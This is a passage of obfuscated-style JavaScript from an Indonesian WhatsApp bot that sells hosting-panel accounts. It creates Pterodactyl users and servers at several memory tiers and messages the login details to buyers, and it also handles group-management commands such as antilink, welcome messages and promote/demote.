          ctf = "Hai @" + v1016.split`@`[0] + "\n\n*➣ USERNAME* : " + v1028.username + "\n*➣ PASSWORD* : " + v1025 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v1016, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v1030 = await v1029.json();
          let v1031 = v1030.attributes.startup;
          let v1032 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v1017,
              description: " ",
              user: v1028.id,
              egg: parseInt(v1018),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v1031,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v1020,
                swap: 0,
                disk: v1022,
                io: 500,
                cpu: v1021
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v1019)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v1033 = await v1032.json();
          if (v1033.errors) {
            return p148.reply(JSON.stringify(v1033.errors[0], null, 2));
          }
          let v1034 = v1033.attributes;
          let v1035 = await p148.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v1028.id + "\n📌NAME: " + v1028.first_name + " " + v1028.last_name + "\n💵MEMORY: " + (v1034.limits.memory === 0 ? "Unlimited" : v1034.limits.memory) + " MB\n📦DISK: " + (v1034.limits.disk === 0 ? "Unlimited" : v1034.limits.disk) + " MB\n⌛CPU: " + v1034.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "7gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v1036 = v646.split(",");
          if (v1036.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v1037 = v1036[0];
          let v1038 = p148.quoted ? p148.quoted.sender : v1036[1] ? v1036[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v1039 = v1037 + "7GB";
          let v1040 = global.eggsnya;
          let v1041 = global.location;
          let v1042 = "7138";
          let v1043 = "140";
          let v1044 = "7138";
          let v1045 = v1037 + "@dray.offc";
          akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg";
          if (!v1038) {
            return;
          }
          let v1046 = (await p147.onWhatsApp(v1038.split`@`[0]))[0] || {};
          let v1047 = v1037 + "Dray001";
          let v1048 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v1045,
              username: v1037,
              first_name: v1037,
              last_name: v1037,
              language: "en",
              password: v1047
            })
          });
          let v1049 = await v1048.json();
          if (v1049.errors) {
            return p148.reply(JSON.stringify(v1049.errors[0], null, 2));
          }
          let v1050 = v1049.attributes;
          let v1051 = await fetch(domain + "/api/application/nests/5/eggs/" + v1040, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v1050.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v1038.split`@`[0] + "\n\n*➣ USERNAME* : " + v1050.username + "\n*➣ PASSWORD* : " + v1047 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v1038, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v1052 = await v1051.json();
          let v1053 = v1052.attributes.startup;
          let v1054 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v1039,
              description: " ",
              user: v1050.id,
              egg: parseInt(v1040),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v1053,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v1042,
                swap: 0,
                disk: v1044,
                io: 500,
                cpu: v1043
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v1041)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v1055 = await v1054.json();
          if (v1055.errors) {
            return p148.reply(JSON.stringify(v1055.errors[0], null, 2));
          }
          let v1056 = v1055.attributes;
          let v1057 = await p148.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v1050.id + "\n📌NAME: " + v1050.first_name + " " + v1050.last_name + "\n💵MEMORY: " + (v1056.limits.memory === 0 ? "Unlimited" : v1056.limits.memory) + " MB\n📦DISK: " + (v1056.limits.disk === 0 ? "Unlimited" : v1056.limits.disk) + " MB\n⌛CPU: " + v1056.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "8gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v1058 = v646.split(",");
          if (v1058.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v1059 = v1058[0];
          let v1060 = p148.quoted ? p148.quoted.sender : v1058[1] ? v1058[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v1061 = v1059 + "8GB";
          let v1062 = global.eggsnya;
          let v1063 = global.location;
          let v1064 = "8138";
          let v1065 = "160";
          let v1066 = "8138";
          let v1067 = v1059 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v1060) {
            return;
          }
          let v1068 = (await p147.onWhatsApp(v1060.split`@`[0]))[0] || {};
          let v1069 = v1059 + "Dray001";
          let v1070 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v1067,
              username: v1059,
              first_name: v1059,
              last_name: v1059,
              language: "en",
              password: v1069
            })
          });
          let v1071 = await v1070.json();
          if (v1071.errors) {
            return p148.reply(JSON.stringify(v1071.errors[0], null, 2));
          }
          let v1072 = v1071.attributes;
          let v1073 = await fetch(domain + "/api/application/nests/5/eggs/" + v1062, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v1072.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v1060.split`@`[0] + "\n\n*➣ USERNAME* : " + v1072.username + "\n*➣ PASSWORD* : " + v1069 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v1060, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v1074 = await v1073.json();
          let v1075 = v1074.attributes.startup;
          let v1076 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v1061,
              description: " ",
              user: v1072.id,
              egg: parseInt(v1062),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v1075,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v1064,
                swap: 0,
                disk: v1066,
                io: 500,
                cpu: v1065
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v1063)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v1077 = await v1076.json();
          if (v1077.errors) {
            return p148.reply(JSON.stringify(v1077.errors[0], null, 2));
          }
          let v1078 = v1077.attributes;
          let v1079 = await p148.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v1072.id + "\n📌NAME: " + v1072.first_name + " " + v1072.last_name + "\n💵MEMORY: " + (v1078.limits.memory === 0 ? "Unlimited" : v1078.limits.memory) + " MB\n📦DISK: " + (v1078.limits.disk === 0 ? "Unlimited" : v1078.limits.disk) + " MB\n⌛CPU: " + v1078.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "9gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v1080 = v646.split(",");
          if (v1080.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v1081 = v1080[0];
          let v1082 = p148.quoted ? p148.quoted.sender : v1080[1] ? v1080[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v1083 = v1081 + "9GB";
          let v1084 = global.eggsnya;
          let v1085 = global.location;
          let v1086 = "9138";
          let v1087 = "180";
          let v1088 = "9138";
          let v1089 = v1081 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v1082) {
            return;
          }
          let v1090 = (await p147.onWhatsApp(v1082.split`@`[0]))[0] || {};
          let v1091 = v1081 + "Dray001";
          let v1092 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v1089,
              username: v1081,
              first_name: v1081,
              last_name: v1081,
              language: "en",
              password: v1091
            })
          });
          let v1093 = await v1092.json();
          if (v1093.errors) {
            return p148.reply(JSON.stringify(v1093.errors[0], null, 2));
          }
          let v1094 = v1093.attributes;
          let v1095 = await fetch(domain + "/api/application/nests/5/eggs/" + v1084, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v1094.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v1082.split`@`[0] + "\n\n*➣ USERNAME* : " + v1094.username + "\n*➣ PASSWORD* : " + v1091 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v1082, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v1096 = await v1095.json();
          let v1097 = v1096.attributes.startup;
          let v1098 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v1083,
              description: " ",
              user: v1094.id,
              egg: parseInt(v1084),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v1097,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v1086,
                swap: 0,
                disk: v1088,
                io: 500,
                cpu: v1087
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v1085)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v1099 = await v1098.json();
          if (v1099.errors) {
            return p148.reply(JSON.stringify(v1099.errors[0], null, 2));
          }
          let v1100 = v1099.attributes;
          let v1101 = await p148.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v1094.id + "\n📌NAME: " + v1094.first_name + " " + v1094.last_name + "\n💵MEMORY: " + (v1100.limits.memory === 0 ? "Unlimited" : v1100.limits.memory) + " MB\n📦DISK: " + (v1100.limits.disk === 0 ? "Unlimited" : v1100.limits.disk) + " MB\n⌛CPU: " + v1100.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "10gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v1102 = v646.split(",");
          if (v1102.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v1103 = v1102[0];
          let v1104 = p148.quoted ? p148.quoted.sender : v1102[1] ? v1102[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v1105 = v1103 + "10gb";
          let v1106 = global.eggsnya;
          let v1107 = global.location;
          let v1108 = "10000";
          let v1109 = "200";
          let v1110 = "10000";
          let v1111 = v1103 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v1104) {
            return;
          }
          let v1112 = (await p147.onWhatsApp(v1104.split`@`[0]))[0] || {};
          let v1113 = v1103 + "Dray001";
          let v1114 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v1111,
              username: v1103,
              first_name: v1103,
              last_name: v1103,
              language: "en",
              password: v1113
            })
          });
          let v1115 = await v1114.json();
          if (v1115.errors) {
            return p148.reply(JSON.stringify(v1115.errors[0], null, 2));
          }
          let v1116 = v1115.attributes;
          let v1117 = await fetch(domain + "/api/application/nests/5/eggs/" + v1106, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v1116.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v1104.split`@`[0] + "\n\n*➣ USERNAME* : " + v1116.username + "\n*➣ PASSWORD* : " + v1113 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v1104, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v1118 = await v1117.json();
          let v1119 = v1118.attributes.startup;
          p147;
          let v1120 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v1105,
              description: " ",
              user: v1116.id,
              egg: parseInt(v1106),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v1119,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v1108,
                swap: 0,
                disk: v1110,
                io: 500,
                cpu: v1109
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v1107)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v1121 = await v1120.json();
          if (v1121.errors) {
            return p148.reply(JSON.stringify(v1121.errors[0], null, 2));
          }
          let v1122 = v1121.attributes;
          let v1123 = await p148.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v1116.id + "\n📌NAME: " + v1116.first_name + " " + v1116.last_name + "\n💵MEMORY: " + (v1122.limits.memory === 0 ? "Unlimited" : v1122.limits.memory) + " MB\n📦DISK: " + (v1122.limits.disk === 0 ? "Unlimited" : v1122.limits.disk) + " MB\n⌛CPU: " + v1122.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "akses":
        if (!v651) {
          return p148.reply("Khusus Group");
        }
        if (!v700) {
          return p148.reply("Fitur Ini Khusus Owner dray,, Lu Siapa Mainin Fitur Ini? ");
        }
        v687.push(p148.chat);
        fs3.writeFileSync("./database/idgrup.json", JSON.stringify(v687));
        p148.reply(v642 + " sukses");
        break;
      case "delakses":
        if (!v700) {
          return p148.reply("Fitur Ini Khusus Owner Dray,, Lu Siapa Mainin Fitur Ini?");
        }
        if (!v651) {
          return p148.reply("Khusus Group");
        }
        var v1124 = v687.indexOf(p148.chat);
        v687.splice(v1124, 1);
        fs3.writeFileSync("./database/idgrup.json", JSON.stringify(v687));
        p148.reply(v642 + " sukses");
        break;
      case "antilink":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Bot harus menjadi admin");
          }
          if (v643[0] === "on") {
            if (v694) {
              return p148.reply("Udah aktif");
            }
            v674.push(p148.chat);
            fs3.writeFileSync("./database/antilink.json", JSON.stringify(v674, null, 2));
            vF9("Successfully Activate Antilink In This Group");
          } else if (v643[0] === "off") {
            if (!v694) {
              return p148.reply("Udah nonaktif");
            }
            let v1125 = v674.indexOf(p148.chat);
            v674.splice(v1125, 1);
            fs3.writeFileSync("./database/antilink.json", JSON.stringify(v674, null, 2));
            vF9("Successfully Disabling Antilink In This Group");
          } else {
            vF9("Kirim perintah " + (v626 + v642) + " on/off\n\nContoh: " + (v626 + v642) + " on");
          }
        }
        break;
      case "welcome":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (v643[0] === "on") {
            if (v692) {
              return p148.reply("Udah on");
            }
            v665.push(p148.chat);
            fs3.writeFileSync("./database/welcome.json", JSON.stringify(v665, null, 2));
            vF9("Sukses mengaktifkan welcome di grup ini");
          } else if (v643[0] === "off") {
            if (!v692) {
              return p148.reply("Udah off");
            }
            let v1126 = v665.indexOf(p148.chat);
            v665.splice(v1126, 1);
            fs3.writeFileSync("./database/welcome.json", JSON.stringify(v665, null, 2));
            vF9("Sukses menonaktifkan welcome di grup ini");
          } else {
            vF9("Kirim perintah " + (v626 + v642) + " on/off\n\nContoh: " + (v626 + v642) + " on");
          }
        }
        break;
      case "left":
      case "goodbye":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (v643[0] === "on") {
            if (v693) {
              return p148.reply("Udah on");
            }
            v666.push(p148.chat);
            fs3.writeFileSync("./database/left.json", JSON.stringify(v666, null, 2));
            vF9("Sukses mengaktifkan goodbye di grup ini");
          } else if (v643[0] === "off") {
            if (!v693) {
              return p148.reply("Udah off");
            }
            let v1127 = v666.indexOf(p148.chat);
            v666.splice(v1127, 1);
            fs3.writeFileSync("./database/welcome.json", JSON.stringify(v666, null, 2));
            vF9("Sukses menonaktifkan goodbye di grup ini");
          } else {
            vF9("Kirim perintah " + (v626 + v642) + " on/off\n\nContoh: " + (v626 + v642) + " on");
          }
        }
        break;
      case "setwelcome":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v700 && !v661) {
            return p148.reply("Fitur Khusus owner!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + v642 + " *teks_welcome*\n\n_Contoh_\n\n" + v642 + " Halo @user, Selamat datang di @group");
          }
          if (isSetWelcome(p148.chat, v663)) {
            return p148.reply("Set welcome already active");
          }
          addSetWelcome(v646, p148.chat, v663);
          vF9("Successfully set welcome!");
        }
        break;
      case "changewelcome":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v700 && !v661) {
            return p148.reply("Fitur Khusus owner!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + v642 + " *teks_welcome*\n\n_Contoh_\n\n" + v642 + " Halo @user, Selamat datang di @group");
          }
          if (isSetWelcome(p148.chat, v663)) {
            changeSetWelcome(q, p148.chat, v663);
            vF9("Sukses change set welcome teks!");
          } else {
            addSetWelcome(q, p148.chat, v663);
            vF9("Sukses change set welcome teks!");
          }
        }
        break;
      case "delsetwelcome":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v700 && !v661) {
            return p148.reply("Fitur Khusus owner!");
          }
          if (!isSetWelcome(p148.chat, v663)) {
            return p148.reply("Belum ada set welcome di sini..");
          }
          removeSetWelcome(p148.chat, v663);
          vF9("Sukses delete set welcome");
        }
        break;
      case "setleft":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v700 && !v661) {
            return p148.reply("Fitur Khusus owner!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + (v626 + v642) + " *teks_left*\n\n_Contoh_\n\n" + (v626 + v642) + " Halo @user, Selamat tinggal dari @group");
          }
          if (isSetLeft(p148.chat, v664)) {
            return p148.reply("Set left already active");
          }
          addSetLeft(q, p148.chat, v664);
          vF9("Successfully set left!");
        }
        break;
      case "changeleft":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v700 && !v661) {
            return p148.reply("Fitur Khusus owner!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + (v626 + v642) + " *teks_left*\n\n_Contoh_\n\n" + (v626 + v642) + " Halo @user, Selamat tinggal dari @group");
          }
          if (isSetLeft(p148.chat, v664)) {
            changeSetLeft(q, p148.chat, v664);
            vF9("Sukses change set left teks!");
          } else {
            addSetLeft(q, p148.chat, v664);
            vF9("Sukses change set left teks!");
          }
        }
        break;
      case "delsetleft":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v700 && !v661) {
            return p148.reply("Fitur Khusus owner!");
          }
          if (!isSetLeft(p148.chat, v664)) {
            return p148.reply("Belum ada set left di sini..");
          }
          removeSetLeft(p148.chat, v664);
          vF9("Sukses delete set left");
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          if (!v646) {
            return p148.reply("Example " + (v626 + v642) + " WhatsApp Bot");
          }
          await p147.groupUpdateDescription(p148.chat, v646).then(p254 => p148.reply("Done")).catch(p255 => p148.reply("Terjadi kesalahan"));
        }
        break;
      case "promote":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          let v1128 = p148.mentionedJid[0] ? p148.mentionedJid[0] : p148.quoted ? p148.quoted.sender : v646.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await p147.groupParticipantsUpdate(p148.chat, [v1128], "promote").then(p256 => p148.reply("Sukses promote member✅")).catch(p257 => p148.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "demote":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          let v1129 = p148.mentionedJid[0] ? p148.mentionedJid[0] : p148.quoted ? p148.quoted.sender : v646.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await p147.groupParticipantsUpdate(p148.chat, [v1129], "demote").then(p258 => p148.reply("Sukses demote admin✅")).catch(p259 => p148.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "setlinkgc":
      case "revoke":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
